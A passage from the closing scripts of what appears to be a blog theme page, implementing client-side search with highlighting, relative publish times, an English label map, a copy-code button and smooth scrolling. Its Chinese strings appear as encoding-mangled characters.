      return soure.slice(0, start) + '<em>' + newStr + '</em>' + soure.slice(start + count);
    }

    pageUl.addEventListener('click', function(event) {
      let target = event.target;
      if (target.__proto__ === HTMLSpanElement.prototype) {
        appendResults(parseInt(target.dataset.i));
      }
    })

    function appendResults(index) {
      let htmlResult = '';
      let start = index || 0;
      let end = Math.min(start + pageSize, finds.length);
      for (let i = start; i < end; i++) {
        const current = finds[i];
        let html = current.title;
        let sum = 0;
        let positions = current.positions;
        positions.forEach(position => {
          html = insertStr(html, position.start + sum, position.count);
          sum += 9;
        })
        htmlResult += `<div class="item"><a class="result-title" href="${current.link}">${html}</a></div>`;
      }
      result.innerHTML = htmlResult;
      pageUl.innerHTML = '';
      let count = finds.length / pageSize;
      let lis = '';
      if (start !== 0) {
        lis += `<span class="fa fa-angle-left" data-i='${start - 1}'></span>`;
      }
      for (let i = 0; i < count; i++) {
        lis += `<span class='${i === start?'current':''}' data-i='${i}'>${i+1}</span>`;     
      }
      if (start+1 < count) {
        lis += `<span class="fa fa-angle-right" data-i='${start+1}'></span>`;  
      }
      pageUl.innerHTML = lis;
    }

    function search(delay) {
      let timer = null
      return function () {
        clearTimeout(timer)
        timer = setTimeout(() => {
          let start = Date.now();
          let segments = searchBox.value.split(' ').filter(c => c != '');
          if (segments.length <= 0) {
            return;
          }
          finds = [];
          let htmlResult = '';
          contents.forEach(content => {
            let title = content.title;
            let positions = [];
            let find = false;
            segments.forEach((segment) => {
              if (content.title.includes(segment)) {
                find = true;
                positions.push({
                  start: content.title.indexOf(segment),
                  count: segment.length
                })
              } else if (content.details.includes(segment)) {
                find = true;
              }
            });
            if (find) {
              finds.push({
                title: content.title,
                link: content.link,
                positions
              });
            }
          })
          appendResults(0);
          statCount.textContent = finds.length;
          statTimes.textContent = Date.now() - start;
        }, delay)
      }
    }
    searchBox.addEventListener('input', search(200));
  }()
</script>

<input hidden id="copy" />
<script>
  !function () {
    let times = document.querySelectorAll('.publish-time');
    for (let i = 0; i < times.length; i++) {
      let date = times[i].dataset.t;
      let time = Math.floor((new Date().getTime() - new Date(date).getTime()) / 1000);
      if (time < 60) {
        str = time + 'ç§’ä¹‹å‰';
      } else if (time < 3600) {
        str = Math.floor(time / 60) + 'åˆ†é’Ÿä¹‹å‰';
      } else if (time >= 3600 && time < 86400) {
        str = Math.floor(time / 3600) + 'å°æ—¶ä¹‹å‰';
      } else if (time >= 86400 && time < 259200) {
        str = Math.floor(time / 86400) + 'å¤©ä¹‹å‰';
      } else {
        str = times[i].textContent;
      }
      times[i].textContent = str;
    }
  }();
</script>

<script>
  let language = '';
  if (language !== '') {
    let map = new Map();
    if (language === 'en') {
      map.set('search', 'Search');
      map.set('category', 'Categories');
      map.set('article', 'Articles');
      map.set('tag', 'Tags');
      map.set('top', 'Top');
      map.set('publish', 'published');
      map.set('minute', ' minutes');
      map.set('read-more', 'Read More');
      map.set('view', 'View');
      map.set('words', ' words');
      map.set('category-in', 'category in');
      map.set('preview', 'Meta');
      map.set('index', 'Toc');
      map.set('no-archives', "You haven't created yet");
      map.set('archives', " articles in total");
      map.set('cloud-tags', " tags in total");
      map.set('copyright', "Copyright: ");
      map.set('author', "Author: ");
      map.set('link', "Link: ");
      map.set('leave-message', "Leave a message");
      map.set('format', "Links Format");
      map.set('site-name', "Name: ");
      map.set('site-link', "Link: ");
      map.set('site-desc', "Desc: ");
      map.set('stat', " related results, taking ");
      map.set('stat-time', " ms");
      map.set('site-img', "Image: ");
    }

    if (map.size > 0) {
      let lanElems = document.querySelectorAll('.language');
      lanElems.forEach(elem => {
        let lan = elem.dataset.lan, text = map.get(lan);
        if (elem.__proto__ === HTMLInputElement.prototype) {
          elem.placeholder = text
        } else {
          if (elem.dataset.count) {
            text = elem.dataset.count + text;
          }
          elem.textContent = text;
        }
      })
    }
  }
  //æ‹¿æ¥ä¸»ä¹‰(çœŸé¦™)^_^ï¼ŒClipboard å®ç°æ‘˜è‡ªæ˜é‡‘ https://juejin.im/post/5aefeb6e6fb9a07aa43c20af
  window.Clipboard = (function (window, document, navigator) {
    var textArea,
      copy;

    // åˆ¤æ–­æ˜¯ä¸æ˜¯iosç«¯
    function isOS() {
      return navigator.userAgent.match(/ipad|iphone/i);
    }
    //åˆ›å»ºæ–‡æœ¬å…ƒç´ 
    function createTextArea(text) {
      textArea = document.createElement('textArea');
      textArea.value = text;
      textArea.style.width = 0;
      textArea.style.height = 0;
      textArea.clientHeight = 0;
      textArea.clientWidth = 0;
      document.body.appendChild(textArea);
    }
    //é€‰æ‹©å†…å®¹
    function selectText() {
      var range,
        selection;

      if (isOS()) {
        range = document.createRange();
        range.selectNodeContents(textArea);
        selection = window.getSelection();
        selection.removeAllRanges();
        selection.addRange(range);
        textArea.setSelectionRange(0, 999999);
      } else {
        textArea.select();
      }
    }

    //å¤åˆ¶åˆ°å‰ªè´´æ¿
    function copyToClipboard() {
      try {
        document.execCommand("Copy")
      } catch (err) {
        alert("å¤åˆ¶é”™è¯¯ï¼è¯·æ‰‹åŠ¨å¤åˆ¶ï¼")
      }
      document.body.removeChild(textArea);
    }

    copy = function (text) {
      createTextArea(text);
      selectText();
      copyToClipboard();
    };

    return {
      copy: copy
    };
  })(window, document, navigator);

  function copyCode(e) {
    if (e.srcElement.tagName === 'SPAN' && e.srcElement.classList.contains('copy-code')) {
      let code = e.currentTarget.querySelector('code');
      var text = code.innerText;
      if (e.srcElement.textContent === 'å¤åˆ¶æˆåŠŸ') {
        return;
      }
      e.srcElement.textContent = 'å¤åˆ¶æˆåŠŸ';
      (function (elem) {
        setTimeout(() => {
          if (elem.textContent === 'å¤åˆ¶æˆåŠŸ') {
            elem.textContent = 'å¤åˆ¶ä»£ç '
          }
        }, 1000);
      })(e.srcElement)
      Clipboard.copy(text);
    }
  }

  let pres = document.querySelectorAll('pre');
  pres.forEach(pre => {
    let code = pre.querySelector('code');
    let copyElem = document.createElement('span');
    copyElem.classList.add('copy-code');
    copyElem.textContent = 'å¤åˆ¶ä»£ç ';
    pre.appendChild(copyElem);
    pre.onclick = copyCode
  })

</script>
<script src="/media/js/motion.js"></script>


<script src="https://cdn.jsdelivr.net/gh/cferdinandi/smooth-scroll/dist/smooth-scroll.polyfills.min.js"></script>
<script>
  var scroll = new SmoothScroll('a[href*="#"]', {
    speed: 200
  });
</script>





</html>